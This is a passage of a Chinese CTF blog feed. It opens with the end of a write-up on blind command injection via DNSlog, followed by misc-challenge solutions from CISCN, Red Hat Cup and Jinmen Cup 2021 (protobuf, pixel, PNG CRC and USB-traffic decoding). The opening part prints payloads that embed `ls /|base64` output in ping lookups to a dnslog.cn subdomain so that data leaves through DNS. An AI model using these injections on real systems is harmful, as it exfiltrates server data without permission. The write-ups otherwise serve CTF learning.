plain"><table><tr><td class="code"><pre><span class="line">ping -c 3 &#96;ls &#x2F;|base64|head -n 1|cut -c 0-80&#96;.DNSLog.cn</span><br></pre></td></tr></table></figure><h3><span id="1">1）</span></h3><p>为解决无法回显的问题，需要一个介质来接收返回的信息，</p><p>DNSLog.cn中Get SubDomain,</p><p>得到一个dnslog的子域名</p><p>在自身服务器中执行命令后</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping -c 3 6t775q.dnslog.cn</span><br></pre></td></tr></table></figure><p>能在DNSLog的Refresh Record中看到自身的ip</p><p>这意味着咱们已经能够利用这种方式得到回显</p><h3><span id="2">2）</span></h3><p>进一步构造</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping -c 3 &#96;ls &#x2F;&#96;.bet8m1.dnslog.cn</span><br></pre></td></tr></table></figure><p>空格问题需要绕过</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping -c 3 &#96;ls &#x2F;|base64&#96;.bet8m1.dnslog.cn</span><br></pre></td></tr></table></figure><p>但直接dump出来出现乱码</p><p>问题在于按行显示的格式问题</p><h3><span id="3">3）</span></h3><p><a class="link" href="https://www.runoob.com/linux/linux-comm-head.html?ivk_sa=1024320u">https://www.runoob.com/linux/linux-comm-head.html?ivk_sa=1024320u<i class="fas fa-external-link-alt"></i></a></p><p><a class="link" href="https://www.runoob.com/linux/linux-comm-cut.html">https://www.runoob.com/linux/linux-comm-cut.html<i class="fas fa-external-link-alt"></i></a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping -c 3 &#96;ls &#x2F;|base64|head -n 1|cut -c 40-80&#96;.bet8m1.dnslog.cn</span><br></pre></td></tr></table></figure><p>截取第一行第40到80个字符，</p><p>注意字符的重复和替代情况</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;dnslog盲注&quot;&gt;&lt;em&gt;DNSlog盲注&lt;/em&gt;&lt;/span&gt;&lt;/h1&gt;
&lt;h2&gt;&lt;span id=&quot;题目源码如下&quot;&gt;题目源码如下：&lt;/span&gt;&lt;/h2&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;</summary>
      
    
    
    
    
    <category term="WEB" scheme="http://mklkx.github.io/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>2021CISCN</title>
    <link href="http://mklkx.github.io/2021/05/18/2021CISCN/"/>
    <id>http://mklkx.github.io/2021/05/18/2021CISCN/</id>
    <published>2021-05-18T02:06:21.000Z</published>
    <updated>2021-05-18T02:28:06.588Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="2021ciscn-misc">2021CISCN-Misc</span></h1><hr><h2><span id="tiny-traffic">tiny traffic</span></h2><p>流量包导出http对象得到一堆文件</p><p>其中【test】和【secret】似乎有点东西</p><p>但直接打开为乱码</p><p>考虑br解码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import brotli</span><br><span class="line">f &#x3D; open(&#39;secret&#39;,&#39;rb&#39;).read()</span><br><span class="line">print(f)</span><br><span class="line">c &#x3D; brotli.decompress(f)</span><br><span class="line">print(c)</span><br><span class="line">#b&#39;\x08\xc8\x01\x10\xa2\xd4\x99\x07\x1a\x0e\n\x05e2345\x12\x057af2c\x1a\x0f\n\x067889b0\x12\x0582bc0 \xc6\xa2\xec\x07*\td172a38dc&#39;</span><br></pre></td></tr></table></figure><p>以上是解码后的【secret】内容，猜测为flag</p><p>【test】</p><p><img lazyload src="/images/loading.svg" data-src="ciscn1.png" alt="1"></p><p>根据内容搜索得到https://blog.csdn.net/u013210620/article/details/81317731</p><p>安装好后，将test后缀改为.proto</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protoc test.proto  --python_out&#x3D;.&#x2F;</span><br></pre></td></tr></table></figure><p>解决报错https://blog.csdn.net/qq_27563511/article/details/80696403</p><p><img lazyload src="/images/loading.svg" data-src="ciscn2.png" alt="2"></p><p>得到test_pb2.py</p><p>编写代码，</p><p>调用这个库</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">import test_pb2</span><br><span class="line"></span><br><span class="line">flag_pb &#x3D; test_pb2.PBResponse()</span><br><span class="line">flag_pb.ParseFromString(b&#39;\x08\xc8\x01\x10\xa2\xd4\x99\x07\x1a\x0e\n\x05e2345\x12\x057af2c\x1a\x0f\n\x067889b0\x12\x0582bc0 \xc6\xa2\xec\x07*\td172a38dc&#39;)</span><br><span class="line">print(flag_pb)</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="ciscn3.png" alt="3"></p><p>按要求拼接得到</p><p><strong>CISCN{e66a22e23457889b0fb1146d172a38dc}</strong></p><h2><span id="running_pixel">running_pixel</span></h2><p>gif动图分离得到382张png</p><p>观察得它们中存在统一RGB值为(233,233,233)的色块</p><p>提取出他们的坐标值</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import cv2</span><br><span class="line">import numpy as np</span><br><span class="line">from PIL import Image</span><br><span class="line">for k in range(0,382):#张数</span><br><span class="line">    im &#x3D; Image.open(&#39;Frame%d.png&#39;%k)</span><br><span class="line">    # print(im.size[0])</span><br><span class="line">    # print(im.size[1])</span><br><span class="line">    for i in range(0,400):</span><br><span class="line">        for j in range(0,400):</span><br><span class="line">            #print(&#39;Frame%d.png&#39;%k)</span><br><span class="line">            # print(im.getpixel((i, j)))</span><br><span class="line">            if(im.getpixel((i, j))&#x3D;&#x3D;(233, 233, 233, 255)):</span><br><span class="line">                # print(&#39;Frame%d.png&#39;%k)</span><br><span class="line">                print(i,j)</span><br><span class="line">                #print(im.getpixel((i,j)))</span><br><span class="line">                break</span><br></pre></td></tr></table></figure><p>保存到xy.txt中</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">img&#x3D;Image.new(&#39;RGB&#39;,(400,400))</span><br><span class="line">file &#x3D; open(&quot;xy.txt&quot;, &quot;r&quot;)</span><br><span class="line">text &#x3D; file.readlines()[0]</span><br><span class="line">ch &#x3D; text.split(&quot; &quot;)</span><br><span class="line">print(ch)</span><br><span class="line">x &#x3D; []</span><br><span class="line">y &#x3D; []</span><br><span class="line">for i in ch:</span><br><span class="line">   x.append(i.split(&#39;,&#39;)[0])</span><br><span class="line">   y.append(i.split(&#39;,&#39;)[1])</span><br><span class="line">#print(x)</span><br><span class="line">print(len(x))</span><br><span class="line">for k in range(len(x)):</span><br><span class="line">   print(k)</span><br><span class="line">   img.putpixel((int(y[k]),int(x[k])),(233,233,233))</span><br><span class="line">   img.save(&quot;test%d.png&quot;%k)</span><br></pre></td></tr></table></figure><p>读取坐标值数据并写在对应位置上</p><p><img lazyload src="/images/loading.svg" data-src="ciscn4.png" alt="4"></p><p>flag的顺序为数字依次出现的数据</p><p><strong>CISCN{12504d0f-9de1-4b00-87a5-a5fdd0986a00}</strong></p><h2><span id="隔空传话">隔空传话</span></h2><p>pdu编码</p><p>首先进行数据清洗</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import re</span><br><span class="line">b &#x3D; []</span><br><span class="line">d &#x3D; []</span><br><span class="line">e &#x3D; []</span><br><span class="line">a &#x3D; open(&#39;data.txt&#39;)</span><br><span class="line">for i in a:</span><br><span class="line">    b.append(i[34:46])</span><br><span class="line"># print(b)</span><br><span class="line"></span><br><span class="line">for i in b:</span><br><span class="line">    # print(i)</span><br><span class="line">    # c &#x3D; i[::2]</span><br><span class="line">    # print(c)</span><br><span class="line">    c&#x3D;&quot;&quot;</span><br><span class="line">    text_list &#x3D; re.findall(&quot;.&#123;2&#125;&quot;, i)</span><br><span class="line">    for j in text_list:</span><br><span class="line">        c+&#x3D;j[::-1]</span><br><span class="line">    d.append(c)</span><br><span class="line">d &#x3D; sorted(d)</span><br><span class="line"># print(d)</span><br><span class="line">#  此时d为已经排序好的顺序</span><br><span class="line">for i in d:</span><br><span class="line">    text_list &#x3D; re.findall(&quot;.&#123;2&#125;&quot;, i)</span><br><span class="line">    c&#x3D;&quot;&quot;</span><br><span class="line">    for j in text_list:</span><br><span class="line">        c+&#x3D;j[::-1]</span><br><span class="line">    e.append(c)</span><br><span class="line"># print(e)</span><br><span class="line">file_handle&#x3D;open(&#39;dnm.txt&#39;,mode&#x3D;&#39;w&#39;)</span><br><span class="line">for i in range(616):</span><br><span class="line">    woc &#x3D; 0</span><br><span class="line">    c &#x3D; (&quot;调转前:&#123;&#125; |调转后: &#123;&#125; \n&quot;.format(d[woc],e[woc]))</span><br><span class="line">    file_handle.write(c)</span><br><span class="line">    woc+&#x3D;1</span><br><span class="line"># e &#x3D; sorted(e)</span><br><span class="line">#</span><br><span class="line"># for i in d:</span><br><span class="line">#     file_handle.write(&quot;&#123;&#125;\n &quot;.format(i))</span><br><span class="line">#     print(i)</span><br><span class="line"># file2 &#x3D; open(&#39;dnm.txt&#39;)</span><br><span class="line">#</span><br><span class="line"># step &#x3D; 0 #计数器</span><br><span class="line"># for i in file2:</span><br><span class="line">#     print(&quot;调转后:&#123;&#125;  调转前:&#123;&#125;&quot;.format(i,e[step]))</span><br><span class="line">#     step +&#x3D; 1</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="ciscn5.png" alt="5"></p><p>得到类似210425194359的，按照年月日时分秒排列的数据</p><p>经过手动匹配后，pdu解码</p><p><a class="link" href="http://www.sendsms.cn/pdu/">http://www.sendsms.cn/pdu/<i class="fas fa-external-link-alt"></i></a></p><p>补充前后关键数据如下：</p><p><img lazyload src="/images/loading.svg" data-src="ciscn6.png" alt="6"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">the first part of the flag is the first 8 digits of your phone number </span><br><span class="line">那其他部分呢 </span><br><span class="line">看看你能从这些数据里发现什么？w465</span><br></pre></td></tr></table></figure><p>拼合数据得到png</p><p><img lazyload src="/images/loading.svg" data-src="ciscn7.png" alt="7"></p><p>贴进010后</p><p>png根据crc32爆破长宽</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf8 -*-</span><br><span class="line">import os</span><br><span class="line">import binascii</span><br><span class="line">import struct</span><br><span class="line">misc &#x3D; open(&quot;Untitled1.png&quot;, &quot;rb&quot;).read()</span><br><span class="line"># 爆破宽</span><br><span class="line">for i in range(1024):</span><br><span class="line">    data &#x3D; misc[12:16] + struct.pack(&#39;&gt;i&#39;, i) + misc[20:29]  # IHDR数据</span><br><span class="line">    crc32 &#x3D; binascii.crc32(data) &amp; 0xffffffff</span><br><span class="line">    if crc32 &#x3D;&#x3D; 0xBFFAF2DD:  # IHDR块的crc32值</span><br><span class="line">        print(&#39;weight&#39;)</span><br><span class="line">        print(i)</span><br><span class="line">        print(&quot;hex:&quot; + hex(i))</span><br><span class="line"># 爆破高</span><br><span class="line">for i in range(1024):</span><br><span class="line">    data &#x3D; misc[12:20] + struct.pack(&#39;&gt;i&#39;, i) + misc[24:29]</span><br><span class="line">    crc32 &#x3D; binascii.crc32(data) &amp; 0xffffffff</span><br><span class="line">    if crc32 &#x3D;&#x3D; 0xBFFAF2DD:</span><br><span class="line">        print(&#39;height&#39;)</span><br><span class="line">        print(i)</span><br><span class="line">        print(&quot;hex:&quot; + hex(i))</span><br><span class="line"># weight</span><br><span class="line"># 465</span><br><span class="line"># hex:0x1d1</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="ciscn8.png" alt="8"></p><p><strong>CISCN{15030442_b586_4c9e_b436_26def12293e4}</strong></p><h2><span id="robot">robot</span></h2><p>给了一个pcapng流</p><p>通过追踪tcp流</p><p>发现【Value.[36,35,0]】字样</p><p>疑似坐标</p><p>通过数据清洗</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import re</span><br><span class="line">with open(&#39;.&#x2F;tcp.txt&#39;,&#39;r&#39;,encoding&#x3D;&quot;utf-8&quot;) as f:</span><br><span class="line">    text &#x3D; f.read()</span><br><span class="line">    p1 &#x3D; re.compile(r&#39;Value\.\[\d+,\d+,-?\d+\.*\d*\]&#39;)</span><br><span class="line">    data &#x3D; (re.findall(p1, text))</span><br><span class="line"></span><br><span class="line">    with open(&#39;data.txt&#39;,&#39;w&#39;,encoding&#x3D;&quot;utf-8&quot;) as l:</span><br><span class="line">        l.write(str(data))</span><br></pre></td></tr></table></figure><p>得到</p><p><img lazyload src="/images/loading.svg" data-src="ciscn9.png" alt="9"></p><p>经过处理，参考前卷代码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">img&#x3D;Image.new(&#39;RGB&#39;,(400,400))</span><br><span class="line">mark&#x3D;[(27,36),(28,35),(29,35),(31,35),(32,35),(33,35),(35,35),(36,35),(37,35),(39,34),(40,34),(41,33),(42,32),(43,32),(45,32),(47,31),(48,29),(49,28),(49,27),(50,26),(50,25),(51,23),(51,22),(51,21),(52,20),(52,19),(52,18),(52,17),(52,16),(52,15),(51,14),(50,14),(49,14),(48,14),(47,14),(46,14),(45,14),(44,14),(43,14),(42,14),(40,14),(39,14),(37,14),(35,14),(34,14),(32,14),(30,14),(28,14),(27,14),(26,14),(25,14),(24,14),(23,14),(22,14),(21,15),(20,16),(19,17),(18,19),(18,21),(18,22),(18,23),(18,24),(18,26),(18,27),(18,28),(18,30),(18,32),(18,33),(18,34),(19,37),(21,39),(21,40),(22,42),(24,44),(24,45),(26,47),(27,48),(28,49),(29,50),(30,51),(31,52),(33,53),(34,53),(35,54),(36,54),(37,54),(38,54),(39,54),(40,54),(41,54),(44,54),(46,54),(48,54),(50,54),(52,53),(53,53),(54,52),(55,52),(56,52),(58,51),(59,50),(61,49),(62,49),(64,47),(65,47),(67,46),(68,46),(70,45),(71,44),(71,44,-10),(125,23),(125,23),(124,22),(123,22),(121,21),(118,20),(115,19),(113,19),(112,18),(111,18),(109,17),(106,16),(104,16),(103,16),(102,15),(101,15),(100,15),(99,15),(98,15),(97,15),(96,15),(95,15),(94,15),(93,15),(92,15),(91,15),(89,15),(87,17),(85,18),(85,19),(84,21),(83,21),(82,22),(82,23),(81,24),(81,26),(80,28),(80,29),(80,31),(80,32),(79,34),(79,35),(79,37),(79,39),(79,41),(79,43),(79,44),(79,46),(79,47),(80,48),(81,49),(82,50),(84,50),(87,51),(88,51),(90,51),(91,51),(93,51),(94,51),(97,51),(100,50),(101,49),(102,49),(103,48),(105,46),(106,45),(108,43),(109,42),(110,41),(111,39),(112,38),(112,36),(113,34),(114,33),(115,32),(115,31),(116,30),(117,28),(118,27),(118,28),(117,30),(116,32),(115,34),(115,36),(114,39),(114,41),(114,43),(114,45),(114,47),(114,48),(114,50),(114,52),(114,53),(115,54),(116,55),(117,56),(118,57),(120,57),(122,57),(124,57),(126,57),(128,57),(131,57),(133,57),(136,57),(138,57),(141,57),(143,56),(145,55),(147,53),(149,52),(150,52),(152,50),(153,49),(155,47),(156,46),(157,45),(157,45,-10),(212,24),(212,24),(213,23),(211,21),(210,20),(209,19),(208,18),(207,17),(206,16),(205,15),(204,15),(201,14),(200,14),(199,14),(197,14),(196,14),(195,14),(193,14),(191,14),(189,16),(188,16),(187,16),(186,17),(185,17),(183,18),(183,20),(183,21),(182,22),(182,23),(182,24),(182,25),(182,26),(182,27),(182,29),(183,31),(184,32),(186,33),(187,34),(188,34),(189,35),(190,35),(192,36),(194,37),(196,37),(198,38),(199,38),(200,38),(201,38),(202,39),(203,39),(204,40),(207,41),(207,42),(208,43),(208,44),(208,45),(208,46),(208,48),(208,50),(208,51),(207,53),(207,54),(206,56),(204,58),(203,60),(202,61),(201,62),(201,63),(200,64),(199,64),(198,64),(197,65),(196,65),(195,65),(193,65),(192,65),(190,65),(189,65),(187,65),(185,65),(184,65),(183,65),(181,64),(180,63),(179,63),(178,62),(177,62),(175,61),(174,60),(173,59),(173,59,-10),(243,20),(243,20),(244,19),(244,21),(244,25),(245,26),(245,29),(247,32),(247,34),(248,36),(248,37),(249,39),(250,40),(251,42),(251,43),(252,44),(254,44),(256,44),(258,44),(260,42),(262,41),(263,40),(265,38),(266,35),(267,32),(268,30),(271,27),(272,25),(273,22),(274,21),(275,20),(275,19),(274,18),(274,20),(272,22),(271,23),(271,26),(268,29),(266,33),(266,35),(265,37),(263,40),(262,42),(262,44),(261,47),(260,49),(259,51),(258,55),(258,56),(257,58),(255,61),(254,62),(253,63),(253,64),(252,65),(251,66),(250,67),(249,68),(248,69),(247,70),(246,71),(245,72),(244,73),(244,73,-10),(298,64),(298,64),(299,65),(300,65),(302,65),(304,65),(306,65),(308,65),(309,65),(312,65),(315,65),(317,65),(319,65),(322,65),(325,65),(327,65),(330,65),(332,65),(334,66),(335,66),(335,66,-10),(20,103),(20,104),(20,107),(20,110),(20,112),(20,114),(20,118),(19,121),(18,124),(17,126),(17,130),(17,134),(17,137),(17,139),(17,142),(17,143),(17,146),(17,147),(17,149),(17,150),(17,149),(17,148),(17,146),(18,145),(18,143),(19,142),(20,141),(20,140),(21,138),(21,137),(22,135),(23,134),(24,132),(25,131),(26,129),(27,128),(28,127),(29,126),(31,125),(32,124),(32,123),(34,121),(35,120),(37,120),(38,119),(40,118),(41,118),(43,117),(44,116),(46,115),(48,115),(49,114),(50,113),(51,113),(52,112),(52,112,-10),(80,121),(80,121),(79,120),(78,121),(77,122),(77,123),(77,124),(76,127),(75,128),(74,129),(73,131),(73,132),(73,133),(72,135),(72,136),(72,137),(72,138),(72,139),(72,140),(72,142),(72,144),(72,145),(73,148),(74,149),(77,150),(78,150),(80,151),(81,151),(82,151),(83,151),(84,151),(85,151),(87,151),(89,151),(90,151),(92,150),(93,150),(95,149),(97,147),(98,146),(99,146),(100,145),(101,144),(102,142),(102,141),(104,139),(104,138),(105,136),(105,135),(105,133),(105,132),(105,131),(105,129),(104,128),(103,126),(102,126),(101,125),(98,123),(96,123),(95,123),(93,123),(92,122),(90,121),(89,121),(86,120),(86,120,-10),(147,98),(147,98),(146,99),(145,100),(144,103),(143,104),(142,105),(142,106),(142,109),(142,111),(142,114),(141,118),(140,120),(139,123),(138,127),(138,129),(137,133),(135,135),(134,137),(133,139),(131,142),(131,143),(131,145),(130,146),(129,149),(128,152),(128,153),(127,156),(127,157),(126,158),(127,157),(129,157),(130,156),(132,156),(134,155),(137,153),(138,152),(139,151),(140,150),(143,149),(144,148),(145,147),(146,146),(147,145),(149,144),(149,143),(150,142),(151,141),(152,140),(152,139),(153,138),(153,137),(153,136),(153,135),(153,134),(153,133),(152,132),(151,131),(150,131),(149,130),(147,129),(147,129,-10),(186,136),(186,136),(183,137),(182,138),(182,139),(182,140),(181,142),(179,144),(179,145),(179,147),(178,149),(177,150),(177,151),(177,152),(177,154),(177,156),(177,157),(177,158),(178,160),(179,161),(180,162),(181,163),(182,164),(184,164),(186,164),(187,164),(188,164),(190,163),(191,162),(192,162),(194,160),(196,159),(197,158),(197,156),(198,155),(200,153),(200,152),(201,150),(201,149),(201,148),(201,147),(201,145),(201,144),(201,142),(201,141),(201,139),(201,138),(200,136),(199,135),(198,135),(197,135),(196,135),(195,135),(193,135),(192,135),(190,135),(189,135),(189,135,-10),(223,167),(223,167),(224,167),(226,167),(228,167),(229,167),(232,167),(233,167),(234,167),(235,167),(237,167),(238,167),(240,167),(241,167),(243,167),(244,167),(246,167),(247,167),(250,168),(251,168),(252,168),(253,168),(254,168),(254,168,-10),(269,135),(271,136),(273,138),(275,140),(276,141),(278,143),(280,145),(282,147),(284,149),(285,150),(288,152),(289,153),(291,154),(293,156),(294,157),(296,159),(297,160),(298,161),(299,162),(299,162,-10),(300,136),(299,136),(297,137),(296,138),(294,141),(294,142),(293,144),(293,145),(292,148),(291,149),(290,151),(288,153),(288,155),(287,156),(286,157),(285,159),(284,160),(283,161),(282,162),(281,163),(280,164),(279,165),(279,165,-10),(327,142),(328,143),(330,145),(332,148),(333,149),(335,151),(337,154),(339,156),(341,158),(342,159),(345,160),(347,161),(348,162),(350,164),(351,165),(352,166),(355,168),(356,169),(356,169,-10),(351,143),(350,143),(348,144),(347,144),(346,145),(343,148),(341,150),(339,152),(336,155),(333,158),(330,159),(327,162),(325,165),(323,167),(322,168),(319,170),(317,171),(316,171),(314,172),(313,172),(313,172)]</span><br><span class="line">print(mark[0])</span><br><span class="line">for j in range(len(mark)):</span><br><span class="line">    for i in range(len(mark)):</span><br><span class="line">        img.putpixel((list(mark[i])[0], list(mark[i])[1]), (255, 255, 255))</span><br><span class="line">img.save(&#39;flag.png&#39;)</span><br></pre></td></tr></table></figure><p>得到</p><p><img lazyload src="/images/loading.svg" data-src="ciscn10.png" alt="10"></p><p>md5加密</p><p><strong>CISCN{d4f1fb80bc11ffd722861367747c0f10}</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;2021ciscn-misc&quot;&gt;2021CISCN-Misc&lt;/span&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;h2&gt;&lt;span id=&quot;tiny-traffic&quot;&gt;tiny traffic&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;流量包导出http对象得到一堆文件&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>2021红帽杯</title>
    <link href="http://mklkx.github.io/2021/05/11/2021%E7%BA%A2%E5%B8%BD%E6%9D%AF/"/>
    <id>http://mklkx.github.io/2021/05/11/2021%E7%BA%A2%E5%B8%BD%E6%9D%AF/</id>
    <published>2021-05-11T06:31:40.000Z</published>
    <updated>2021-05-11T06:35:05.293Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="2021红帽杯">2021红帽杯</span></h3><hr><h4><span id="签到">签到</span></h4><p>根据文件名提示，</p><p>把txt拖进010editor，</p><p>更改编码方式为【EBCDIC】</p><p>flag{we1c0me_t0_redhat2021}</p><h4><span id="colorful-code">colorful code</span></h4><p>附件得到两个data</p><p>一个全是数字，一个是十六进制</p><p>结合题目【colorful】</p><p>猜测为图片隐写</p><p>1）如何形成图片data2开头为【000000】</p><p><img lazyload src="/images/loading.svg" data-src="1.png" alt="1"></p><p>猜测为RGB，相当于字典</p><p>而data1为索引值，数字对应data2中的第几组数据。</p><p>接下来是长宽的问题</p><p>尝试了很多方式，</p><p>发现data1的长度为7068，微调后发现【7067=37*191】</p><p>脚本如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">im &#x3D; open(&quot;data1&quot;,&quot;r&quot;)</span><br><span class="line">mark &#x3D; im.readline().split(&#39; &#39;)</span><br><span class="line">print(mark)</span><br><span class="line">print(len(mark))</span><br><span class="line">c &#x3D; [(0,0,0),(0,0,192),(0,255,255),(0,255,0),(255,192,255),(255,192,192),(192,192,255),(192,192,0),(255,0,255),(255,0,0),(192,0,0),(192,0,192),(255,255,255),(255,255,0),(255,255,192),(0,192,0),(0,192,192),(192,255,255),(192,255,192),(0,0,255)]</span><br><span class="line">pic &#x3D; Image.new(&quot;RGB&quot;,(37,191))</span><br><span class="line">k&#x3D;0</span><br><span class="line">for i in range(37):</span><br><span class="line">    for j in range(191):</span><br><span class="line">        pic.putpixel((int(i),int(j)),c[int(mark[k])])</span><br><span class="line">        k +&#x3D; 1</span><br><span class="line">pic.save(&#39;flag.png&#39;)</span><br></pre></td></tr></table></figure><p>得到png</p><p><img lazyload src="/images/loading.svg" data-src="2.png" alt="2"></p><p>找到解密网站https://www.bertnase.de/npiet/npiet-execute.php</p><p>得到flag</p><p><img lazyload src="/images/loading.svg" data-src="3.png" alt="3"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">88842f20-fb8c-45c9-ae8f-36135b6a0f11</span><br></pre></td></tr></table></figure><p>加flag头上交</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;2021红帽杯&quot;&gt;2021红帽杯&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;h4&gt;&lt;span id=&quot;签到&quot;&gt;签到&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;根据文件名提示，&lt;/p&gt;
&lt;p&gt;把txt拖进010editor，&lt;/p&gt;
&lt;p&gt;更改编码方式为【EBCDIC】&lt;</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>2021津门杯</title>
    <link href="http://mklkx.github.io/2021/05/11/2021%E6%B4%A5%E9%97%A8%E6%9D%AF/"/>
    <id>http://mklkx.github.io/2021/05/11/2021%E6%B4%A5%E9%97%A8%E6%9D%AF/</id>
    <published>2021-05-11T06:27:53.000Z</published>
    <updated>2021-06-06T13:37:47.180Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="2021津门杯misc">2021津门杯Misc</span></h1><hr><h2><span id="m0usb">m0usb</span></h2><blockquote><p>运气好+师傅们都还没起床，有幸拿了一血</p></blockquote><p>usb流量</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shark -r 12.pcapng -T fields -e usb.capdata &gt; usbdata.txt</span><br></pre></td></tr></table></figure><p>提取出来的文件带空行，调整命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tshark -r 12.pcapng -T fields -e usb.capdata | sed &#39;&#x2F;^\s*$&#x2F;d&#39; &gt; usbdata.txt</span><br></pre></td></tr></table></figure><p>usb脚本结合</p><p>txt格式（无“：”）</p><p>更改脚本</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">usb_codes &#x3D; &#123;</span><br><span class="line">    0x04: &quot;aA&quot;, 0x05: &quot;bB&quot;, 0x06: &quot;cC&quot;, 0x07: &quot;dD&quot;, 0x08: &quot;eE&quot;, 0x09: &quot;fF&quot;,</span><br><span class="line">    0x0A: &quot;gG&quot;, 0x0B: &quot;hH&quot;, 0x0C: &quot;iI&quot;, 0x0D: &quot;jJ&quot;, 0x0E: &quot;kK&quot;, 0x0F: &quot;lL&quot;,</span><br><span class="line">    0x10: &quot;mM&quot;, 0x11: &quot;nN&quot;, 0x12: &quot;oO&quot;, 0x13: &quot;pP&quot;, 0x14: &quot;qQ&quot;, 0x15: &quot;rR&quot;,</span><br><span class="line">    0x16: &quot;sS&quot;, 0x17: &quot;tT&quot;, 0x18: &quot;uU&quot;, 0x19: &quot;vV&quot;, 0x1A: &quot;wW&quot;, 0x1B: &quot;xX&quot;,</span><br><span class="line">    0x1C: &quot;yY&quot;, 0x1D: &quot;zZ&quot;, 0x1E: &quot;1!&quot;, 0x1F: &quot;2@&quot;, 0x20: &quot;3#&quot;, 0x21: &quot;4$&quot;,</span><br><span class="line">    0x22: &quot;5%&quot;, 0x23: &quot;6^&quot;, 0x24: &quot;7&amp;&quot;, 0x25: &quot;8*&quot;, 0x26: &quot;9(&quot;, 0x27: &quot;0)&quot;,</span><br><span class="line">    0x2C: &quot;  &quot;, 0x2D: &quot;-_&quot;, 0x2E: &quot;&#x3D;+&quot;, 0x2F: &quot;[&#123;&quot;, 0x30: &quot;]&#125;&quot;, 0x32: &quot;#~&quot;,</span><br><span class="line">    0x33: &quot;;:&quot;, 0x34: &quot;&#39;\&quot;&quot;, 0x36: &quot;,&lt;&quot;, 0x37: &quot;.&gt;&quot;, 0x38: &quot;&#x2F;?&quot;, 0x39: &quot;&lt;CAP&gt;&lt;CAP&gt;&quot;,</span><br><span class="line">    0x3a: &quot;&lt;F1&gt;&lt;F1&gt;&quot;, 0x3b: &quot;&lt;F4&gt;&lt;F4&gt;&quot;, 0x3e: &quot;&lt;F5&gt;&lt;F5&gt;&quot;, 0x3f: &quot;&lt;F6&gt;&lt;F6&gt;&quot;,</span><br><span class="line">    0x40: &quot;&lt;F7&gt;&lt;F7&gt;&quot;, 0x41: &quot;&lt;F8&gt;&lt;F8&gt;&quot;, 0x42: &quot;&lt;F9&gt;&lt;F9&gt;&quot;, 0x43: &quot;&lt;F10&gt;&lt;F10&gt;&quot;,</span><br><span class="line">    0x44: &quot;&lt;F11&gt;&lt;F11&gt;&quot;, 0x45: &quot;&lt;F12&gt;&lt;F12&gt;&quot;</span><br><span class="line">&#125;</span><br><span class="line">data &#x3D; &#39;&#39;</span><br><span class="line">for x in open(&quot;uuu.txt&quot;, &quot;r&quot;).readlines():</span><br><span class="line">    code &#x3D; int(x[4:6], 16) # 有冒号时提取数据的[6:8]，无冒号时数据在[4:6]</span><br><span class="line">    # print(x[4:6])</span><br><span class="line">    if code &#x3D;&#x3D; 0:</span><br><span class="line">        continue</span><br><span class="line">    if code &#x3D;&#x3D; 0x28:</span><br><span class="line">        print(&#39;ENTER!&#39;)</span><br><span class="line">        print(data)</span><br><span class="line">        data &#x3D; &#39;&#39;</span><br><span class="line">        continue</span><br><span class="line">    upper &#x3D; 0</span><br><span class="line">    if int(x[0:2], 16) &#x3D;&#x3D; 0x02 or int(x[0:2], 16) &#x3D;&#x3D; 0x20:</span><br><span class="line">        upper &#x3D; 1</span><br><span class="line">    data +&#x3D; usb_codes[code][upper]</span><br><span class="line">print(data)</span><br><span class="line"></span><br><span class="line"># 884080810882108108821042084010421</span><br></pre></td></tr></table></figure><p>01248编码</p><p>上网找到脚本</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line"># -*- 